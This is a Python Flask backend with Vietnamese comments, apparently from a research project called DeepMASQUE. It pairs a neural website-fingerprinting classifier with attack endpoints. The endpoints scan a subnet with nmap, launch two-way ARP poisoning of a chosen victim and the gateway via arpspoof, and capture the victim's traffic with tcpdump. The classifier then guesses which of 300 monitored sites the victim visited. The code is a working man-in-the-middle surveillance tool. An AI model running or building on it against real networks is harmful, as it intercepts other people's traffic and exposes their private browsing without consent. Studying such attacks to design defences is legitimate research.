"""
DeepMASQUE Flask Backend
========================
Chạy: python app.py
API:  http://localhost:5000

Cấu trúc thư mục cần có:
  app.py
  checkpoints/
      latest.weights.h5      ← model weights
      centroids.npy          ← build trước bằng: python3 scripts/build_centroids.py
      label_map.json         ← tự sinh bởi build_centroids.py
      scaler.pkl             ← tự sinh bởi build_centroids.py
      selector.pkl           ← tự sinh bởi build_centroids.py
"""

import os, gc, json, time, threading, pickle
import numpy as np
import pandas as pd
from flask import Flask, request, jsonify
from flask_cors import CORS

# ── TF import ──
import tensorflow as tf
from tensorflow.keras.models import Model
from tensorflow.keras.layers import (
    Conv1D, MaxPooling1D, Dense, Activation, ZeroPadding1D,
    GlobalAveragePooling1D, Add, Concatenate, Dropout,
    BatchNormalization, Input, Lambda
)

# ══════════════════════════════════════════
# CONFIG — chỉnh đường dẫn ở đây
# ══════════════════════════════════════════
CONFIG = {
    "weights_path":   "checkpoints/latest.weights.h5",
    "centroids_path": "checkpoints/centroids.npy",
    "label_map_path": "checkpoints/label_map.json",
    "scaler_path":    "checkpoints/scaler.pkl",
    "selector_path":  "checkpoints/selector.pkl",
    "seq_length":     5000,
    "num_monitored":  300,
    "meta_dim":       9,
    "cos_threshold":  0.1531,
}

app = Flask(__name__)
CORS(app)  # cho phép dashboard HTML call API

# ── Global state ──
MODEL       = None
CENTROIDS   = None   # shape (300, 128)
LABEL_MAP   = None   # {int: "website.com"}
SCALER      = None
SELECTOR    = None
MODEL_READY = False
LOAD_STATUS = {"status": "idle", "message": ""}


# ══════════════════════════════════════════
# MODEL ARCHITECTURE (copy từ notebook)
# ══════════════════════════════════════════
params = {'kernel_initializer': 'he_normal'}

def dilated_basic_1d(filters, suffix, stage=0, block=0,
                     kernel_size=3, numerical_name=False,
                     stride=None, dilations=(1, 1)):
    if stride is None:
        stride = 1 if block != 0 or stage == 0 else 2
    block_char = f'b{block}' if (block > 0 and numerical_name) else chr(ord('a') + block)
    stage_char  = str(stage + 2)

    def f(x):
        y = Conv1D(filters, kernel_size, padding='causal', strides=stride,
                   dilation_rate=dilations[0], use_bias=False,
                   name=f'res{stage_char}{block_char}_branch2a_{suffix}', **params)(x)
        y = BatchNormalization(epsilon=1e-5,
                               name=f'bn{stage_char}{block_char}_branch2a_{suffix}')(y)
        y = Activation('relu',
                       name=f'res{stage_char}{block_char}_branch2a_relu_{suffix}')(y)
        y = Conv1D(filters, kernel_size, padding='causal', use_bias=False,
                   dilation_rate=dilations[1],
                   name=f'res{stage_char}{block_char}_branch2b_{suffix}', **params)(y)
        y = BatchNormalization(epsilon=1e-5,
                               name=f'bn{stage_char}{block_char}_branch2b_{suffix}')(y)
        if block == 0:
            shortcut = Conv1D(filters, 1, strides=stride, use_bias=False,
                              name=f'res{stage_char}{block_char}_branch1_{suffix}', **params)(x)
            shortcut = BatchNormalization(epsilon=1e-5,
                                          name=f'bn{stage_char}{block_char}_branch1_{suffix}')(shortcut)
        else:
            shortcut = x
        y = Add(name=f'res{stage_char}{block_char}_{suffix}')([y, shortcut])
        y = Activation('relu', name=f'res{stage_char}{block_char}_relu_{suffix}')(y)
        return y
    return f


def ResNet18_1D(inputs, suffix, block_fn=dilated_basic_1d,
                blocks=[2,2,2,2], numerical_names=[True]*4):
    x = ZeroPadding1D(padding=3, name=f'padding_conv1_{suffix}')(inputs)
    x = Conv1D(64, 7, strides=2, use_bias=False, name=f'conv1_{suffix}')(x)
    x = BatchNormalization(epsilon=1e-5, name=f'bn_conv1_{suffix}')(x)
    x = Activation('relu', name=f'conv1_relu_{suffix}')(x)
    x = MaxPooling1D(3, strides=2, padding='same', name=f'pool1_{suffix}')(x)
    features = 64
    for stage_id, iterations in enumerate(blocks):
        x = block_fn(features, suffix, stage_id, 0,
                     dilations=(1, 2), numerical_name=False)(x)
        for block_id in range(1, iterations):
            x = block_fn(features, suffix, stage_id, block_id,
                         dilations=(4, 8),
                         numerical_name=(block_id > 0 and numerical_names[stage_id]))(x)
        features *= 2
    x = GlobalAveragePooling1D(name=f'pool5_{suffix}')(x)
    return x


def build_model(num_classes, meta_dim, seq_length=5000):
    dir_input  = Input(shape=(seq_length, 1), name='dir_input')
    time_input = Input(shape=(seq_length, 1), name='time_input')
    size_input = Input(shape=(seq_length, 1), name='size_input')
    meta_input = Input(shape=(meta_dim,),     name='metadata_input')

    dir_out  = ResNet18_1D(dir_input,  'dir',  dilated_basic_1d)
    time_out = ResNet18_1D(time_input, 'time', dilated_basic_1d)
    size_out = ResNet18_1D(size_input, 'size', dilated_basic_1d)

    meta_out = Dense(32)(meta_input)
    meta_out = BatchNormalization()(meta_out)
    meta_out = Activation('relu')(meta_out)

    combined = Concatenate()([dir_out, time_out, size_out, meta_out])

    # Classification head
    fc = Dense(1024, name='fc1')(combined)
    fc = BatchNormalization(name='fc1_bn')(fc)
    fc = Activation('relu', name='fc1_relu')(fc)
    fc = Dropout(0.6, name='fc1_drop')(fc)
    class_out = Dense(num_classes, activation='softmax', name='class_output')(fc)

    # Embedding head (dùng để predict)
    emb = Dense(128, name='emb_proj')(combined)
    emb_out = Lambda(
        lambda x: tf.math.l2_normalize(x, axis=1), name='emb_output'
    )(emb)

    return Model(inputs=[dir_input, time_input, size_input, meta_input],
                 outputs=[class_out, emb_out])


# ══════════════════════════════════════════
# FEATURE EXTRACTION (từ CSV 8 cột)
# ══════════════════════════════════════════
def csv_to_features(df, seq_length=5000, client_ip=None):
    """
    Input: DataFrame với cột protocol;length;relative_time;direction;src_ip;src_port;dst_ip;dst_port
    Output: (dir_seq, iat_seq, size_norm, meta_13)
    """
    # Dùng cột direction có sẵn (đã được pcap2csv.py set đúng)
    # client_ip chỉ dùng để override nếu cột direction không đáng tin
    if client_ip and 'src_ip' in df.columns:
        dirs = np.where(df['src_ip'].values == client_ip, 1, 0)
    else:
        dirs = df['direction'].values.astype(int)

    # direction encode khớp notebook: direction==0 → -1, direction==1 → +1
    dirs_encoded = np.where(dirs == 0, -1, 1)

    times   = df['relative_time'].values.astype(np.float32)
    lengths = df['length'].values.astype(np.float32)

    limit = min(len(dirs_encoded), seq_length)

    dir_seq  = np.zeros(seq_length, dtype=np.float32)
    time_seq = np.zeros(seq_length, dtype=np.float32)
    size_seq = np.zeros(seq_length, dtype=np.float32)
    dir_seq[:limit]  = dirs_encoded[:limit]
    time_seq[:limit] = times[:limit]
    size_seq[:limit] = lengths[:limit]

    # IAT (inter-arrival time)
    iat_seq = np.zeros(seq_length, dtype=np.float32)
    iat_seq[1:limit] = time_seq[1:limit] - time_seq[:limit-1]

    # Size normalize
    size_norm = size_seq / 1500.0

    # Metadata 13 chiều — dùng TOÀN BỘ sequence (khớp notebook gốc)
    in_mask  = dirs_encoded == -1
    out_mask = dirs_encoded == 1
    ti  = np.sum(in_mask)
    to_ = np.sum(out_mask)
    tp  = ti + to_
    tt  = float(times[-1]) if len(times) > 0 else 0.0

    if tp == 0:
        meta = np.zeros(13, dtype=np.float32)
    else:
        msi = float(np.mean(lengths[in_mask]))  if ti  > 0 else 0.0
        mso = float(np.mean(lengths[out_mask])) if to_ > 0 else 0.0
        mst = float(np.mean(lengths))
        ri  = msi / mst if mst > 0 else 0.0
        ro  = mso / mst if mst > 0 else 0.0
        tin  = times[in_mask]
        tout = times[out_mask]
        mti  = float(np.mean(np.diff(tin)))  if len(tin)  > 1 else 0.0
        mto  = float(np.mean(np.diff(tout))) if len(tout) > 1 else 0.0
        meta = np.array(
            [tp, ti, to_, ti/tp, to_/tp, tt, tt/tp, mso, msi, ri, ro, mti, mto],
            dtype=np.float32
        )

    return dir_seq, iat_seq, size_norm, meta


def prepare_model_inputs(dir_seq, iat_seq, size_seq, meta_9dim):
    """Reshape về đúng shape model cần: (1, seq_length, 1)"""
    dir_arr  = np.expand_dims(dir_seq,  axis=(0, -1)).astype(np.float32)
    time_arr = np.expand_dims(iat_seq,  axis=(0, -1)).astype(np.float32)
    size_arr = np.expand_dims(size_seq, axis=(0, -1)).astype(np.float32)
    meta_arr = meta_9dim.reshape(1, -1).astype(np.float32)
    return {
        'dir_input':      dir_arr,
        'time_input':     time_arr,
        'size_input':     size_arr,
        'metadata_input': meta_arr,
    }


# ══════════════════════════════════════════
# LOAD MODEL & CENTROIDS
# ══════════════════════════════════════════
def load_model_and_centroids():
    global MODEL, CENTROIDS, LABEL_MAP, SCALER, SELECTOR, MODEL_READY, LOAD_STATUS

    try:
        # ── Kiểm tra tất cả file cần thiết ──
        required = {
            "weights":   CONFIG['weights_path'],
            "centroids": CONFIG['centroids_path'],
            "label_map": CONFIG['label_map_path'],
            "scaler":    CONFIG['scaler_path'],
            "selector":  CONFIG['selector_path'],
        }
        missing = [name for name, path in required.items() if not os.path.exists(path)]
        if missing:
            raise FileNotFoundError(
                f"Missing files: {missing}\n"
                f"Run first: python3 scripts/build_centroids.py"
            )

        # ── Build model architecture ──
        LOAD_STATUS = {"status": "loading", "message": "Building model architecture..."}
        MODEL = build_model(
            num_classes=CONFIG['num_monitored'],
            meta_dim=CONFIG['meta_dim'],
            seq_length=CONFIG['seq_length']
        )

        # ── Load weights ──
        LOAD_STATUS["message"] = "Loading weights..."
        MODEL.load_weights(CONFIG['weights_path'])
        print(f"[+] Weights loaded: {CONFIG['weights_path']}")

        # ── Load label map ──
        LOAD_STATUS["message"] = "Loading label map..."
        with open(CONFIG['label_map_path'], 'r') as f:
            raw = json.load(f)
        LABEL_MAP = {int(k): v for k, v in raw.items()}
        print(f"[+] Label map: {len(LABEL_MAP)} classes")

        # ── Load centroids ──
        LOAD_STATUS["message"] = "Loading centroids..."
        CENTROIDS = np.load(CONFIG['centroids_path'])
        print(f"[+] Centroids: shape={CENTROIDS.shape}")

        # ── Load scaler + selector ──
        LOAD_STATUS["message"] = "Loading scaler & selector..."
        with open(CONFIG['scaler_path'], 'rb') as f:
            SCALER = pickle.load(f)
        with open(CONFIG['selector_path'], 'rb') as f:
            SELECTOR = pickle.load(f)
        print(f"[+] Scaler & selector loaded")

        MODEL_READY = True
        LOAD_STATUS = {"status": "ready", "message": f"Model ready. {len(LABEL_MAP)} classes."}
        print("[+] Model ready!")

    except Exception as e:
        LOAD_STATUS = {"status": "error", "message": str(e)}
        print(f"[!] Error: {e}")


# ══════════════════════════════════════════
# PREDICT PIPELINE
# ══════════════════════════════════════════
def predict_single_trace(df, client_ip=None):
    """
    Input:  DataFrame CSV (8 cột)
    Output: dict với prediction result
    """
    seq_length = CONFIG['seq_length']

    # 1. Extract features
    dir_seq, iat_seq, size_seq, meta_13 = csv_to_features(df, seq_length, client_ip)

    # 2. Scale + select metadata
    meta_scaled = SCALER.transform(meta_13.reshape(1, -1))
    meta_9 = SELECTOR.transform(meta_scaled)[0]

    # 3. Prepare model inputs
    inputs = prepare_model_inputs(dir_seq, iat_seq, size_seq, meta_9)

    # 4. Forward pass → embedding
    _, emb = MODEL.predict(inputs, verbose=0)
    emb = emb[0]  # (128,)

    # 5. Cosine similarity với tất cả centroids
    emb_norm = emb / (np.linalg.norm(emb) + 1e-8)
    sims = emb_norm @ CENTROIDS.T       # (300,)
    cos_dists = 1 - sims

    # 6. Top-5
    top5_idx = np.argsort(cos_dists)[:5]
    top5 = []
    for idx in top5_idx:
        site = LABEL_MAP.get(int(idx), f"class_{idx}")
        cos_d = float(cos_dists[idx])
        # Convert cosine distance → confidence score (0→1)
        conf = float(np.clip(1 - cos_d / CONFIG['cos_threshold'], 0, 1))
        top5.append({"site": site, "cos_dist": round(cos_d, 4), "confidence": round(conf, 4)})

    # 7. Open-world check
    best_cos_dist = float(cos_dists[top5_idx[0]])
    is_monitored  = best_cos_dist < CONFIG['cos_threshold']

    return {
        "is_monitored":  is_monitored,
        "prediction":    top5[0]["site"] if is_monitored else "UNKNOWN (unmonitored)",
        "confidence":    top5[0]["confidence"] if is_monitored else 0.0,
        "cos_dist":      round(best_cos_dist, 4),
        "threshold":     CONFIG['cos_threshold'],
        "top5":          top5,
        "num_packets":   len(df),
    }


# ══════════════════════════════════════════
# FLASK ROUTES
# ══════════════════════════════════════════

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        "model_ready": MODEL_READY,
        "load_status": LOAD_STATUS,
        "num_classes": len(LABEL_MAP) if LABEL_MAP else 0,
        "centroids_shape": list(CENTROIDS.shape) if CENTROIDS is not None else None,
    })


@app.route('/predict/csv', methods=['POST'])
def predict_from_csv():
    """
    Upload file CSV trực tiếp.
    Form field: file (CSV file), client_ip (optional)
    """
    if not MODEL_READY:
        return jsonify({"error": "Model not ready yet", "load_status": LOAD_STATUS}), 503

    if 'file' not in request.files:
        return jsonify({"error": "No file uploaded"}), 400

    f = request.files['file']
    client_ip = request.form.get('client_ip', None)

    try:
        df = pd.read_csv(f, sep=';')
        required = {'protocol','length','relative_time','direction','src_ip','src_port','dst_ip','dst_port'}
        missing = required - set(df.columns)
        if missing:
            return jsonify({"error": f"Missing columns: {missing}"}), 400

        t0 = time.time()
        result = predict_single_trace(df, client_ip)
        result["inference_time_ms"] = round((time.time() - t0) * 1000, 1)
        return jsonify(result)

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/predict/path', methods=['POST'])
def predict_from_path():
    """
    Nhận đường dẫn file CSV trên server.
    Body JSON: {"csv_path": "/tmp/trace.csv", "client_ip": "192.168.0.120"}
    """
    if not MODEL_READY:
        return jsonify({"error": "Model not ready yet", "load_status": LOAD_STATUS}), 503

    data = request.get_json()
    if not data or 'csv_path' not in data:
        return jsonify({"error": "Missing csv_path in JSON body"}), 400

    csv_path  = data['csv_path']
    client_ip = data.get('client_ip', None)

    if not os.path.exists(csv_path):
        return jsonify({"error": f"File not found: {csv_path}"}), 404

    try:
        df = pd.read_csv(csv_path, sep=';')
        t0 = time.time()
        result = predict_single_trace(df, client_ip)
        result["inference_time_ms"] = round((time.time() - t0) * 1000, 1)
        result["csv_path"] = csv_path
        return jsonify(result)

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/predict/pcap', methods=['POST'])
def predict_from_pcap():
    """
    Upload file PCAP, tự convert sang CSV rồi predict.
    Cần cài: pip install scapy
    Form field: file (PCAP), client_ip (required để lọc traffic đúng)
    """
    if not MODEL_READY:
        return jsonify({"error": "Model not ready yet", "load_status": LOAD_STATUS}), 503

    if 'file' not in request.files:
        return jsonify({"error": "No file uploaded"}), 400

    client_ip = request.form.get('client_ip')
    if not client_ip:
        return jsonify({"error": "client_ip required for PCAP conversion"}), 400

    f = request.files['file']
    tmp_pcap = f'/tmp/upload_{int(time.time())}.pcap'
    tmp_csv  = tmp_pcap.replace('.pcap', '.csv')
    f.save(tmp_pcap)

    try:
        from scapy.all import rdpcap, IP, UDP
        pkts = rdpcap(tmp_pcap)

        rows = []
        t0_abs = None
        for pkt in pkts:
            if IP not in pkt: continue
            src = pkt[IP].src
            dst = pkt[IP].dst
            if src != client_ip and dst != client_ip: continue

            ts = float(pkt.time)
            if t0_abs is None: t0_abs = ts
            rel_time = ts - t0_abs

            direction = 1 if src == client_ip else 0
            proto     = 1 if UDP in pkt else 0
            length    = len(pkt)
            src_port  = pkt.sport if hasattr(pkt, 'sport') else 0
            dst_port  = pkt.dport if hasattr(pkt, 'dport') else 0

            rows.append([proto, length, rel_time, direction, src, src_port, dst, dst_port])

        df = pd.DataFrame(rows, columns=[
            'protocol','length','relative_time','direction',
            'src_ip','src_port','dst_ip','dst_port'
        ])
        df.to_csv(tmp_csv, sep=';', index=False)

        t0 = time.time()
        result = predict_single_trace(df, client_ip)
        result["inference_time_ms"] = round((time.time() - t0) * 1000, 1)
        result["num_packets"] = len(df)
        result["csv_saved"] = tmp_csv
        return jsonify(result)

    except ImportError:
        return jsonify({"error": "scapy not installed: pip install scapy"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        if os.path.exists(tmp_pcap):
            os.remove(tmp_pcap)


@app.route('/labels', methods=['GET'])
def get_labels():
    """Trả về danh sách 300 website được monitor."""
    if not LABEL_MAP:
        return jsonify({"error": "Model not loaded"}), 503
    return jsonify({"labels": LABEL_MAP, "count": len(LABEL_MAP)})


@app.route('/')
def index():
    html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'attack_dashboard.html')
    if not os.path.exists(html_path):
        return "attack_dashboard.html not found", 404
    return open(html_path, encoding='utf-8').read()


@app.route('/health', methods=['GET'])
def health():
    return jsonify({"ok": True})


# ══════════════════════════════════════════
# ATTACK CONTROL ENDPOINTS
# ══════════════════════════════════════════
import subprocess, signal, shlex

# Process handles
PROCS = {
    "arp_victim":  None,
    "arp_gateway": None,
    "tcpdump":     None,
}

ATTACK_STATE = {
    "victim_ip":    None,
    "gateway_ip":   None,
    "interface":    None,
    "pcap_path":    "/tmp/victim_traffic.pcap",
    "csv_path":     "/tmp/trace.csv",
    "arp_running":  False,
    "cap_running":  False,
    "packets":      0,
}


def proc_running(key):
    p = PROCS.get(key)
    return p is not None and p.poll() is None


# ── Detect Gateway ──
@app.route('/attack/gateway', methods=['GET'])
def detect_gateway():
    """Tự detect gateway IP bằng route -n"""
    try:
        r = subprocess.run(['route', '-n'], capture_output=True, text=True, timeout=5)
        gateway_ip = None
        iface = None
        for line in r.stdout.split('\n'):
            parts = line.split()
            if len(parts) >= 8 and parts[0] == '0.0.0.0':
                gateway_ip = parts[1]
                iface = parts[7]
                break
        if not gateway_ip:
            return jsonify({"error": "Cannot detect gateway"}), 500
        return jsonify({"ok": True, "gateway_ip": gateway_ip, "interface": iface, "raw": r.stdout})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Scan ──
@app.route('/attack/scan', methods=['POST'])
def attack_scan():
    """
    Chạy nmap -sn để scan host trong subnet.
    Body: {"subnet": "192.168.0.0/24"}
    """
    data = request.get_json() or {}
    subnet = data.get("subnet", "192.168.0.0/24")

    try:
        result = subprocess.run(
            ["nmap", "-sn", "--host-timeout", "3s", subnet],
            capture_output=True, text=True, timeout=30
        )
        output = result.stdout

        # Parse hosts từ nmap output
        hosts = []
        lines = output.split('\n')
        current = {}
        for line in lines:
            if 'Nmap scan report for' in line:
                if current: hosts.append(current)
                ip = line.split()[-1].strip('()')
                current = {"ip": ip, "mac": "", "hostname": "", "latency": ""}
            elif 'Host is up' in line and current:
                import re
                m = re.search(r'\(([\d.]+s)\)', line)
                current["latency"] = m.group(1) if m else ""
            elif 'MAC Address:' in line and current:
                parts = line.strip().split()
                current["mac"] = parts[2] if len(parts) > 2 else ""
                current["hostname"] = ' '.join(parts[3:]).strip('()') if len(parts) > 3 else ""
        if current and current.get("ip"):
            hosts.append(current)

        return jsonify({"ok": True, "hosts": hosts, "raw": output})

    except subprocess.TimeoutExpired:
        return jsonify({"error": "nmap timeout"}), 500
    except FileNotFoundError:
        return jsonify({"error": "nmap not found. Install: sudo apt install nmap"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── ARP Spoofing ──
@app.route('/attack/arp/start', methods=['POST'])
def arp_start():
    """
    Bật ARP poisoning.
    Body: {"victim_ip": "...", "gateway_ip": "...", "interface": "ens33"}
    """
    data = request.get_json() or {}
    victim_ip  = data.get("victim_ip")
    gateway_ip = data.get("gateway_ip", "192.168.0.1")
    iface      = data.get("interface", "ens33")

    if not victim_ip:
        return jsonify({"error": "victim_ip required"}), 400

    if proc_running("arp_victim") or proc_running("arp_gateway"):
        return jsonify({"error": "ARP already running"}), 400

    try:
        # Bật ip_forward
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       capture_output=True, check=True)

        # arpspoof: poison victim
        PROCS["arp_victim"] = subprocess.Popen(
            ["arpspoof", "-i", iface, "-t", victim_ip, gateway_ip],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        # arpspoof: poison gateway
        PROCS["arp_gateway"] = subprocess.Popen(
            ["arpspoof", "-i", iface, "-t", gateway_ip, victim_ip],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

        ATTACK_STATE.update({
            "victim_ip":   victim_ip,
            "gateway_ip":  gateway_ip,
            "interface":   iface,
            "arp_running": True,
        })

        return jsonify({
            "ok": True,
            "message": f"ARP poisoning started: {victim_ip} ↔ {gateway_ip}",
            "pids": {
                "arp_victim":  PROCS["arp_victim"].pid,
                "arp_gateway": PROCS["arp_gateway"].pid,
            }
        })

    except FileNotFoundError:
        return jsonify({"error": "arpspoof not found. Install: sudo apt install dsniff"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/attack/arp/stop', methods=['POST'])
def arp_stop():
    """Dừng ARP poisoning."""
    stopped = []
    for key in ("arp_victim", "arp_gateway"):
        p = PROCS.get(key)
        if p and p.poll() is None:
            p.terminate()
            try: p.wait(timeout=3)
            except: p.kill()
            stopped.append(key)
        PROCS[key] = None

    ATTACK_STATE["arp_running"] = False

    # Tắt ip_forward
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                   capture_output=True)

    return jsonify({"ok": True, "stopped": stopped})


# ── Capture ──
@app.route('/attack/capture/start', methods=['POST'])
def capture_start():
    """
    Bắt đầu tcpdump.
    Body: {"victim_ip": "...", "interface": "ens33",
           "pcap_path": "/tmp/victim_traffic.pcap", "duration": 30}
    """
    data       = request.get_json() or {}
    victim_ip  = data.get("victim_ip") or ATTACK_STATE.get("victim_ip")
    iface      = data.get("interface") or ATTACK_STATE.get("interface", "ens33")
    pcap_path  = data.get("pcap_path", "/tmp/victim_traffic.pcap")
    duration   = int(data.get("duration", 0))   # 0 = không giới hạn

    if not victim_ip:
        return jsonify({"error": "victim_ip required"}), 400

    if proc_running("tcpdump"):
        return jsonify({"error": "Capture already running"}), 400

    # Xoá pcap cũ nếu có
    if os.path.exists(pcap_path):
        os.remove(pcap_path)

    cmd = ["tcpdump", "-i", iface, "-w", pcap_path,
           "host", victim_ip, "-U", "-q"]
    if duration > 0:
        cmd = ["timeout", str(duration)] + cmd

    try:
        PROCS["tcpdump"] = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        ATTACK_STATE.update({
            "victim_ip":  victim_ip,
            "interface":  iface,
            "pcap_path":  pcap_path,
            "cap_running": True,
            "packets":    0,
        })

        return jsonify({
            "ok": True,
            "message": f"Capturing traffic from {victim_ip}",
            "pcap_path": pcap_path,
            "pid": PROCS["tcpdump"].pid,
        })

    except FileNotFoundError:
        return jsonify({"error": "tcpdump not found. Install: sudo apt install tcpdump"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/attack/capture/stop', methods=['POST'])
def capture_stop():
    """Dừng tcpdump, trả về số packet và path pcap."""
    p = PROCS.get("tcpdump")
    if p and p.poll() is None:
        p.terminate()
        try: p.wait(timeout=5)
        except: p.kill()
    PROCS["tcpdump"] = None
    ATTACK_STATE["cap_running"] = False

    pcap_path = ATTACK_STATE.get("pcap_path", "/tmp/victim_traffic.pcap")
    size_kb = 0
    if os.path.exists(pcap_path):
        size_kb = round(os.path.getsize(pcap_path) / 1024, 1)

        # Đếm packet bằng tcpdump -r
        try:
            r = subprocess.run(
                ["tcpdump", "-r", pcap_path, "--count"],
                capture_output=True, text=True, timeout=10
            )
            import re
            m = re.search(r'(\d+) packets', r.stderr + r.stdout)
            ATTACK_STATE["packets"] = int(m.group(1)) if m else 0
        except Exception:
            ATTACK_STATE["packets"] = 0

    return jsonify({
        "ok": True,
        "pcap_path": pcap_path,
        "size_kb":   size_kb,
        "packets":   ATTACK_STATE["packets"],
    })


@app.route('/attack/capture/status', methods=['GET'])
def capture_status():
    """Trả về trạng thái capture hiện tại."""
    running = proc_running("tcpdump")
    pcap_path = ATTACK_STATE.get("pcap_path", "/tmp/victim_traffic.pcap")
    size_kb = 0
    if os.path.exists(pcap_path):
        size_kb = round(os.path.getsize(pcap_path) / 1024, 1)

    return jsonify({
        "running":  running,
        "pcap_path": pcap_path,
        "size_kb":  size_kb,
    })


# ── Convert ──
@app.route('/attack/convert', methods=['POST'])
def attack_convert():
    """
    Chạy pcap2csv.py để convert pcap → csv.
    Body: {"pcap_path": "...", "csv_path": "...", "client_ip": "..."}
    """
    data       = request.get_json() or {}
    pcap_path  = data.get("pcap_path")  or ATTACK_STATE.get("pcap_path", "/tmp/victim_traffic.pcap")
    csv_path   = data.get("csv_path")   or ATTACK_STATE.get("csv_path",  "/tmp/trace.csv")
    client_ip  = data.get("client_ip")  or ATTACK_STATE.get("victim_ip")

    if not os.path.exists(pcap_path):
        return jsonify({"error": f"PCAP not found: {pcap_path}"}), 404

    # Tìm pcap2csv.py
    script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scripts", "pcap2csv.py")
    if not os.path.exists(script):
        return jsonify({"error": f"pcap2csv.py not found at {script}"}), 500

    cmd = ["python3", script, pcap_path, csv_path]
    if client_ip:
        cmd += ["--client", client_ip]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if result.returncode != 0:
            return jsonify({"error": result.stderr or result.stdout}), 500

        # Đếm rows
        rows = 0
        if os.path.exists(csv_path):
            with open(csv_path) as f:
                rows = sum(1 for _ in f) - 1  # trừ header

        ATTACK_STATE["csv_path"] = csv_path

        return jsonify({
            "ok":       True,
            "csv_path": csv_path,
            "rows":     rows,
            "stdout":   result.stdout.strip(),
        })

    except subprocess.TimeoutExpired:
        return jsonify({"error": "pcap2csv timeout"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Overall status ──
@app.route('/attack/status', methods=['GET'])
def attack_status():
    """Trả về trạng thái toàn bộ attack pipeline."""
    return jsonify({
        "arp_running": proc_running("arp_victim") or proc_running("arp_gateway"),
        "cap_running": proc_running("tcpdump"),
        "model_ready": MODEL_READY,
        "victim_ip":   ATTACK_STATE.get("victim_ip"),
        "gateway_ip":  ATTACK_STATE.get("gateway_ip"),
        "interface":   ATTACK_STATE.get("interface"),
        "pcap_path":   ATTACK_STATE.get("pcap_path"),
        "csv_path":    ATTACK_STATE.get("csv_path"),
        "packets":     ATTACK_STATE.get("packets", 0),
    })


# ══════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════
if __name__ == '__main__':
    print("=" * 55)
    print("  DeepMASQUE Flask Backend")
    print("=" * 55)

    # Load model trong background thread để Flask start ngay
    t = threading.Thread(target=load_model_and_centroids, daemon=True)
    t.start()

    app.run(host='0.0.0.0', port=5000, debug=False)